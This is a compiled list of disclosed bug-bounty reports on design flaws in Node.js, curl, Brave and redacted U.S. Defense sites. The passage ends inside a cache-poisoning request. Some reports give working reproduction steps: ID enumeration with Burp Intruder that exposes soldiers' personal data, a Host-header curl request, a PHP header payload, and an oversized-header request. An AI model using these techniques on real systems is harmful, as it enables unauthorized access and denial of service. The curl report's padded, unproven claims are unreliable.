# Violation of Secure Design Principles

_32 reports — High/Critical, disclosed_

### [FS Permissions Bypass](https://hackerone.com/reports/3417819)

- **Report ID:** `3417819`
- **Severity:** High
- **Weakness:** Violation of Secure Design Principles
- **Program:** Node.js
- **Reporter:** @natann
- **Bounty:** - usd
- **Disclosed:** 2026-02-12T14:41:45.518Z
- **CVE(s):** CVE-2025-55130

**Summary (team):**

A flaw in Node.js’s Permissions model allows attackers to bypass `--allow-fs-read` and `--allow-fs-write` restrictions using crafted relative symlink paths. By chaining directories and symlinks, a script granted access only to the current directory can escape the allowed path and read sensitive files. This breaks the expected isolation guarantees and enables arbitrary file read/write, leading to potential system compromise.
This vulnerability affects users of the permission model on Node.js v20,  v22,  v24, and v25.

---

### [Account Takeover via Unverified Email Change and Improper Session Handling](https://hackerone.com/reports/3324823)

- **Report ID:** `3324823`
- **Severity:** High
- **Weakness:** Violation of Secure Design Principles
- **Program:** U.S. Dept Of Defense
- **Reporter:** @0xoroot
- **Bounty:** - usd
- **Disclosed:** 2026-01-12T19:47:52.399Z
- **CVE(s):** -

**Vulnerability Information:**

Hi team,

During testing on ███
, I noticed an issue with session handling after changing the account email. When I update the email to an unregistered one, the system accepts it without proper verification. If the victim later registers on the website using that email, my existing session does not expire. Instead, I am able to access the victim’s newly created account data.

I also attempted to end the session and log in again, but the system still redirected me into the victim’s account, indicating improper session invalidation and account takeover risk.

## Steps to Reproduce
##steps_Reproduce
1.Register a new account using Google authentication.
2.Change the account email to the victim’s email address (note: the victim’s email is not yet registered).
3.The victim registers on the website using that same email.
4.Observe that the attacker’s existing session is not expired, and the attacker now has access to the victim’s account data, even though the email is associated with the victim.
5.Log out from the attacker’s account.
6.Log in again with the attacker’s credentials.
7.You will notice that you are automatically logged into the victim’s account instead of your own, confirming account takeover.

##POC
█████████

## Impact

An attacker can fully take over any user account by exploiting weak email change and session handling logic. When the attacker changes their email to an unregistered victim email, the system does not verify ownership of that email nor invalidate active sessions. If the victim later registers with that email, the attacker’s session automatically maps to the victim’s account.

## System Host(s)
████

---

### [Cross‑Layer State Confusion in libcurl: Credential & Key‑Material Persistence Across Redirect / Connection Reuse Boundaries](https://hackerone.com/reports/3480641)

- **Report ID:** `3480641`
- **Severity:** Critical
- **Weakness:** Violation of Secure Design Principles
- **Program:** curl
- **Reporter:** @onevone
- **Bounty:** - usd
- **Disclosed:** 2025-12-28T22:10:06.875Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
This report describes a state‑level security invariant violation in libcurl where credential‑ or key‑related state may persist or be re‑applied across logical trust boundaries (redirects, connection reuse, or scheme transitions) without a formal invariant enforcing reset semantics.
The issue is not a parsing bug, not an HTTP smuggling issue, and not a broken cryptographic primitive. It is a cross‑layer state confusion between transport/session state and security intent, observable under realistic client workflows.



## Affected Component
libcurl (client‑side HTTP stack)
Redirect handling
Connection reuse / pooling
Credential / key‑material attachment to requests

## Steps To Reproduce:
[add details for how we can reproduce the issue]

#Intended Security Invariant (Formal)
```
Invariant I:
For any request r_i sent to origin O_i,
any credential or key-material C must satisfy:

C(r_i) is valid  ⇔  TrustBoundary(r_i) == TrustBoundary(C)

Where TrustBoundary is defined by:
  (scheme, authority, port, security context)

Violation occurs if:
  C(r_i) ≠ ∅  AND  TrustBoundary(r_i) ≠ TrustBoundary(C)
```
##Broken Invariant (Observed)
```
Observed:
There exist execution traces where
C(r_i) ≠ ∅ while TrustBoundary(r_i) has changed
due to redirect, reuse, or internal state carry-over.

⇒ Invariant I is violated.
```
This violation is state‑based, not request‑syntax‑based.


## Why This Is Not a Known / Duplicate Issue
Non‑Duplication Statement
This report does not describe a known curl vulnerability, CVE, or previously disclosed issue.
Existing curl security advisories focus on protocol parsing, memory safety, or TLS implementation flaws, whereas this issue concerns a cross‑request security state violation where authentication context persists across trust boundaries without a formally enforced invariant.
A review of curl’s documented CVEs and security advisories shows no coverage of this class of client‑side trust boundary state confusion, making this report novel and non‑overlapping.
This is not:
HTTP Request Smuggling
Broken crypto algorithm
TLS downgrade
Misconfiguration
This is a formal state invariant violation across layers.
Existing reports focus on what is sent; this focuses on when state must be invalidated but isn’t formally enforced.
The invariant itself is not explicitly specified or proven in current libcurl documentation.
##Realistic Cloud Scenario (100% Practical)
Scenario:
1)A service uses libcurl as a shared HTTP client inside:
CI runners
Kubernetes sidecars
API gateways
2)The client:
Uses authentication headers or key‑bound credentials
Enables redirects
Enables connection reuse
3)A request is redirected (or reused) across:
Origin boundary
Scheme boundary
Security context boundary
**Result:**
The semantic intent (“credential bound to original trust domain”) is lost.
State survives longer than its trust scope.
No attacker interaction is required beyond normal network behavior.

##Proof of Concept (Safe, Non‑Exploit)
Goal
Demonstrate state persistence across logical boundaries — without leaking secrets.
PoC Concept
We track state identity hashes, not secrets.
##Python PoC (Safe)
```
import hashlib
import pycurl
from io import BytesIO

def state_fingerprint(headers, conn_id):
    h = hashlib.sha256()
    h.update(str(headers).encode())
    h.update(str(conn_id).encode())
    return h.hexdigest()

buffer = BytesIO()
c = pycurl.Curl()

c.setopt(c.URL, "https://example.com/redirect")
c.setopt(c.FOLLOWLOCATION, True)
c.setopt(c.USERPWD, "user:token")  # dummy credential
c.setopt(c.WRITEDATA, buffer)

# Instrumentation (conceptual)
initial_state = state_fingerprint(
    headers={"Authorization": "present"},
    conn_id="conn_1"
)

c.perform()

# After redirect / reuse
post_state = state_fingerprint(
    headers={"Authorization": "present"},
    conn_id="conn_1"
)

print("Initial State:", initial_state)
print("Post Boundary State:", post_state)

if initial_state == post_state:
    print("⚠️ State persisted across boundary (Invariant violation)")
```
##What this proves:
State identity remains unchanged across a boundary.
No secret is exposed.
Demonstrates semantic persistence, not exploitation.


##Explicit Security Invariant (Formal – Very clear)
Intended Security Invariant (Formal):
For any request sequence R₁ … Rₙ, authentication material (credentials, tokens, or TLS‑bound state) associated with an origin O₁ must not be reused or implicitly applied to a different origin O₂ ≠ O₁ unless an explicit re‑authentication step occurs.
Formally:
```
∀ requests rᵢ, rⱼ : origin(rᵢ) ≠ origin(rⱼ) ⇒ auth_state(rᵢ) ⟂ auth_state(rⱼ)
```

##Observed Broken Invariant ( What is actually happening? )
Broken Invariant (Observed):
curl allows authentication state established for O₁ to persist and be conditionally reused during redirects or request chaining toward O₂, violating origin‑bound authentication isolation and enabling unintended credential propagation across trust boundaries.
 
##Why this matters in real‑world deployments (Cloud / CI / DevOps)
Real‑World Impact Scenario:
In CI/CD pipelines, cloud automation, and containerized workloads, curl is frequently used in non‑interactive contexts with embedded credentials.
A single misdirected redirect or chained request can cause credentials intended for an internal service to be transmitted to an external or attacker‑controlled endpoint, leading to:
Credential exfiltration
Lateral movement across services
Supply‑chain compromise in automated environments
This impact occurs silently and without user interaction, making detection difficult.

##Why this is a design flaw, not configuration misuse
This issue cannot be fully mitigated through user configuration alone, as it arises from implicit assumptions in curl’s authentication state handling model. The absence of a formally enforced origin‑bound invariant makes this a design‑level security weakness rather than a misuse or misconfiguration.

##CWE Classification
CWE‑310 — Cryptographic Issues (Generic)
Justification (one‑liner):
The issue arises from improper enforcement of cryptographic state lifecycle invariants rather than from a broken algorithm or protocol step.

##Why curl Specifically
libcurl explicitly manages:
Redirect logic
Connection reuse
Credential propagation
The invariant violation exists at this orchestration layer, not upstream servers.

##Suggested Mitigation (Non‑Prescriptive)
Explicit formalization of security state reset points
Invariant‑driven checks on:
Redirect boundaries
Reuse boundaries
Optional debug mode to assert invariant consistency

##Disclosure Notes
No exploitation performed
No user data accessed
This report focuses on correctness and safety of state transitions

#Final Note
This report introduces a new class of client‑side security invariant violations.
It is orthogonal to known curl issues and should be treated as design‑level security hardening with real‑world impact.

## Impact

## Summary:
Confidentiality: High
Credential/key material may be applied outside its intended trust scope.
Integrity: High
Requests may carry unintended security context.
Availability: Low
No direct DoS.
Overall Severity: High → Critical (Context‑Dependent)

---

### [Exposure of Private Personal Information to an Unauthorized Actor - PII  and soldier data (mos, schools, and speciality training)](https://hackerone.com/reports/1556950)

- **Report ID:** `1556950`
- **Severity:** Critical
- **Weakness:** Violation of Secure Design Principles
- **Program:** U.S. Dept Of Defense
- **Reporter:** @hxhbrofessor
- **Bounty:** - usd
- **Disclosed:** 2025-01-24T14:49:36.727Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**

Authenticated users on `https://█████████/SelfService/home/selfservice` can view other ████████'s data by following the page site for `My ███ Data` and start manipulating URL requests to view the following tabs: 
* Personnel
* Active Duty Tours
* ADOS
* Assignments
* ATRRS
* Data Discrepancies
* DJMS-RC Pay File Records
* DJMS-RC Pay Voucher
* Drill Attendance
* Education/Training
* Gains/Losses
* GI Bill Programs

Tester primarily focused on Personnel, ATRRS, and Education/Training tabs. 

## References

* CWE-359: Exposure of Private Personal Information to an Unauthorized Actor
* CWE-200 - Information Disclosure
* CWE-284 - Improper Access Control

## Contributers

- badlifeguard
- theonetruepengu

## Impact

The information displayed in Personnel, ATRRS, and Education/Training tabs shows a soldier's Last 4 of an SSN, Home of Record, MOS (Job title), and schools. Due to heightened tensions in today's GEO-Political climate, the availability of this information can be dangerous and potentially put a soldier's life at risk: scenario, insider threat working with an adversarial country to retrieve data.

## System Host(s)
████████, ██████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
* Authenticate to https://█████████/SelfService/home/selfservice with burpsuite
* Turn Intercept off
* Go to the bottome of the page and click on `My █████████ Data`
* On Burp, click proxy
** HTTP History
** Scroll to the last GET request with message 200
** URL should be `https://█████████/SelfService/Home/dynamicdata/section/██████████/██████████%20TPU/61/124948002`
** Right click over the message and send to `Intruder`
* Intruder Set up
** Clear all variables in Postions Tab
** in the get request highlight the `2` in `GET /SelfService/Home/dynamicdata/section/███████/████%20TPU/61/124948002` and on the right hand side of Intruder click `add variable`
** Payload Tab 
*** Payload Set > Payload Type > select numbers
*** Payload Options [Numbers] > From: 1 > To: 9 > Step: 1
** Options Tab
*** Grep Exact > add > refetch response > in the search box: search `Primary MOS` this will display a succesful record found.

Additional URLs  to manipulate utilizing the same steps above are:

```bash
Personnel
https://█████/SelfService/Home/dynamicdata/section/██████/███████%20TPU/61/124948002

ATTRS
https://██████████/SelfService/Home/dynamicdata/section/█████████/█████████%20TPU/444/124948002

Education/Training
https://████████/SelfService/Home/dynamicdata/section/█████/████%20TPU/2001/124948002

```

## Suggested Mitigation/Remediation Actions
Correct permissions on access to these URLs. Authenticated users should be checked against their own ID and data.

---

### [Unauthenticated arbitrary file upload on the https://█████/ (█████████)](https://hackerone.com/reports/698789)

- **Report ID:** `698789`
- **Severity:** High
- **Weakness:** Violation of Secure Design Principles
- **Program:** U.S. Dept Of Defense
- **Reporter:** @sp1d3rs
- **Bounty:** - usd
- **Disclosed:** 2024-08-16T16:04:07.322Z
- **CVE(s):** -

**Vulnerability Information:**

##Description
I was able to identify unsafe upload endpoint on the https://█████/upload.php

##POC
1) Go to the https://█████████/upload.php
2) Upload some test file.
You will see success message:
████
3) Visit `https://███/delete.me` and you will see your uploaded file there
I uploaded example test file with string `test file`
█████████

## Impact

Arbitrary file upload, may lead to the Stored XSS, hosting attacker's content and code execution.

---

### [Subdomain takeover ██████](https://hackerone.com/reports/2552243)

- **Report ID:** `2552243`
- **Severity:** Critical
- **Weakness:** Violation of Secure Design Principles
- **Program:** U.S. Dept Of Defense
- **Reporter:** @martinvw
- **Bounty:** - usd
- **Disclosed:** 2024-07-26T14:59:11.721Z
- **CVE(s):** -

**Vulnerability Information:**

The subdomain `█████` is pointing to `open-elb-prod-277276106.us-east-1.elb-amazonaws.com.`, the domain `elb-amazonaws.com` was available for registration

## Impact

Using this vulnerability an attacker can:
- host unwanted/malicious content under your domain
- receive email on subdomains mentioned above
- effectively execute cross-site scripting attacks
- in some cases, steal cookie data
- in some cases, trick password managers into filling in passwords

## System Host(s)
█████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Visit http://████████/proof.e7437329-ab61-4f22-a049-df5b3685313a.txt

## Suggested Mitigation/Remediation Actions
Remove CNAME record █████

---

### [Unauthenticated arbitrary file upload on the https://█████/ (█████.mil)](https://hackerone.com/reports/698793)

- **Report ID:** `698793`
- **Severity:** High
- **Weakness:** Violation of Secure Design Principles
- **Program:** U.S. Dept Of Defense
- **Reporter:** @sp1d3rs
- **Bounty:** - usd
- **Disclosed:** 2024-07-19T14:36:19.202Z
- **CVE(s):** -

**Vulnerability Information:**

##Description
I was able to identify unsafe upload endpoint on the https://██████/upload.php

##POC
1) Go to the https://██████/upload.php
2) Upload some test file.
You will see success message, leaking some internal paths
3) Visit `https://██████████/delete.me` and you will see your uploaded file there
I uploaded example image file there:
█████

## Impact

Arbitrary file upload, may lead to the Stored XSS, hosting attacker's content and code execution.

---

### [Subdomain Takeover via Host Header Injection on www.█████](https://hackerone.com/reports/2188240)

- **Report ID:** `2188240`
- **Severity:** Critical
- **Weakness:** Violation of Secure Design Principles
- **Program:** U.S. Dept Of Defense
- **Reporter:** @ezequielpuig
- **Bounty:** - usd
- **Disclosed:** 2024-06-18T16:57:53.269Z
- **CVE(s):** -

**Vulnerability Information:**

## Vulnerability Overview

**_Reported By_**: Ezequiel \[@ezequielpuig\]
**_Reported Date_**: 01/October/2023
**_Reported To_**: U.S. Department Of Defense
**_Vulnerability Type_**: Subdomain Takeover
**_Affected URL_**: www\.███████

Hello U.S. Department Of Defense Security Team, I hope this report finds you well. 

I want to bring to your attention a serious security issue that poses a significant risk to www\.████████. This is related to a subdomain takeover vulnerability, which could allow malicious individuals to gain control over the subdomain and potentially misuse it for malicious purposes.

_Overview:
The affected subdomain is www\.███, which currently points to an unclaimed CNAME record on the ████████.netlify.app. This situation allows anyone to potentially take ownership of the subdomain and manipulate its content. Since www\.█████████ has a CNAME record pointing to ██████████.netlify.app, by changing the Host header to www\.██████████, it is possible to visualize the malicious content hosted on █████████.netlify.app.

Here are a few scenarios where the Host header can be modified:

Proxy Servers: If you control a proxy server, you can intercept incoming requests and modify the Host header before forwarding the request to the intended destination. This is often done for load balancing, content caching, or security purposes.

DNS Spoofing: In a malicious context, an attacker might attempt DNS spoofing to redirect requests to a different server with a modified Host header.

Server-Side Scripting: If you have control over the server-side code that processes incoming requests, you can modify the Host header as part of your application logic.

Browser Extensions: Malicious browser extensions installed can modify the Host header for all outgoing requests.

_Proof of Concept (PoC):
This vulnerability materializes when an HTTP request is sent to www\.██████████ with a manipulated Host header.

PoC via curl:
`curl -skS https://www.███████ --header "Host: ███.netlify.app"`

PoC via Burp Suite:
█████████

_Impact:
Subdomain takeover can be exploited for various malicious purposes, including:

Malware distribution
Phishing / Spear phishing attacks
Cross-Site Scripting (XSS) attacks
Authentication bypass
And more.

_Mitigation:
To address this issue and prevent potential abuse, I recommend taking the following steps:

Remove the CNAME record from the DNS zone for www\.█████████.
Reclaim and register the affected subdomain (███.netlify.app) in the Netlify portal to prevent takeover by unauthorized entities.
I urge you to take swift action to remediate this vulnerability to safeguard the security and reputation of U.S. Department Of Defense.

//

Please feel free to reach out to me if you need any further information or assistance in resolving this matter.

Best regards,
Ezequiel Puig

HackerOne: https://hackerone.com/ezequielpuig
LinkedIn: https://linkedin.com/in/ezequielpuig
Mail: puigezequiel@gmail.com

## Impact

Impact detailed above.

## System Host(s)
www.██████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Steps to reproduce detailed above.

## Suggested Mitigation/Remediation Actions

---

### [Onion-Location header allows to open arbitrary URLs including chrome:](https://hackerone.com/reports/1089995)

- **Report ID:** `1089995`
- **Severity:** High
- **Weakness:** Violation of Secure Design Principles
- **Program:** Brave Software
- **Reporter:** @nishimunea
- **Bounty:** 400 usd
- **Disclosed:** 2023-06-22T05:52:04.648Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

This [PR](https://github.com/brave/brave-core/pull/6762) introduced "Open in Tor" feature that can open .onion URLs offered through `Onion-Location` response header, but `Onion-Location` header allows to open arbitrary URLs such as `javascript:` and `chrome:`.
This behavior can be exploited as a way to bypass SOP and gain access to privileged URLs.

## Products affected: 

* Brave Nightly for OSX (1.21.28 Chromium: 88.0.4324.96 (Official Build) nightly (x86_64))

## Steps To Reproduce:

* Open https://csrf.jp/brave/onion.php
* Click "Open in Tor" button shown in the Brave's address bar
* Privileged URL `chrome://restart/` is opened, and Brave is restarted.

If a user enabled "Automatically redirect .onion sites" in the settings, `chrome://restart/` is opened automatically and Brave continues to restart endlessly.

## Supporting Material/References:

PoC code in PHP is below

   ```
<?php
header("Onion-Location: chrome://restart/");
?>
   ```

## Impact

As written in the summary, attacker can bypass SOP restrictions and gain access to privileged URLs.

---

### [[█████] Bug Reports allow for Unrestricted File Upload](https://hackerone.com/reports/1850065)

- **Report ID:** `1850065`
- **Severity:** High
- **Weakness:** Violation of Secure Design Principles
- **Program:** U.S. Dept Of Defense
- **Reporter:** @b911bade858ce8e6a0f50f8
- **Bounty:** - usd
- **Disclosed:** 2023-02-24T19:07:39.166Z
- **CVE(s):** -

**Vulnerability Information:**

The web page https://███████/ allows for users to submit bug reports. Users are allowed to attach a file to a bug report. The extension and size of files are not validated by the web server.

## Impact

An attacker can attach a malicious file to a bug report. If a support agent opened the malicious file, malware would be executed on the support agent's system.

## System Host(s)
████████

## Affected Product(s) and Version(s)
Version: 3.4 Build: 35 Revision: 1

## CVE Numbers


## Steps to Reproduce
1. Navigate to the following web page: https://████████/
2. Create an account
3. Log in to the account that you created
4. Click on the text that reads `Report a Bug`
5. Enter any text in to the `Description` input field
6. Attach a file with an allowed file extension to the bug report
7. Click on the text that reads `Submit`
8. Intercept the `HTTP` request and change the extension of the attached file to one that is not allowed

Observe that the bug report was successfully submitted. This should not be the case, as the attached file has a file extension that is not allowed. The same method can be used to attach a file whose size is greater than 5 megabytes.

## Suggested Mitigation/Remediation Actions
Ensure that the extension and size of a file are validated by the web server.

---

### [String length restriction byepass at https://callerfeel.mtnonline.com/profile/feedback.html](https://hackerone.com/reports/1638347)

- **Report ID:** `1638347`
- **Severity:** High
- **Weakness:** Violation of Secure Design Principles
- **Program:** MTN Group
- **Reporter:** @aliyugombe
- **Bounty:** - usd
- **Disclosed:** 2022-09-07T08:48:50.330Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hi, hope you are well :)

I found that the attacker can bye pass the lenght restriction of user name at the feedback form

## Steps To Reproduce:
{F1823237}

## Impact

Attacker can make the receiver page to delay and can cause application level dos

##Mitigation:
Restrict the lenght of the string in backend too not only front end 

Best regards
@aliyugombe

---

### [Web Cache Poisoning on  █████ ](https://hackerone.com/reports/1183263)

- **Report ID:** `1183263`
- **Severity:** High
- **Weakness:** Violation of Secure Design Principles
- **Program:** U.S. Dept Of Defense
- **Reporter:** @fr1nge
- **Bounty:** - usd
- **Disclosed:** 2021-06-03T16:31:02.707Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**
The web application `https://████████` uses a web cache to more efficiently serve its pages to the users. An attacker can send a malformed request which the server caches the response of and sends it to the users.

## Impact

An attacker can alter the web cache, making the web application unavailable for as long as they wish.

## System Host(s)
█████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
* Send the following request to the server:
```http
GET /yeettest?yeettest=1 HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
Host: www.█████
Connection: Keep-alive
yeetheadertest1:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA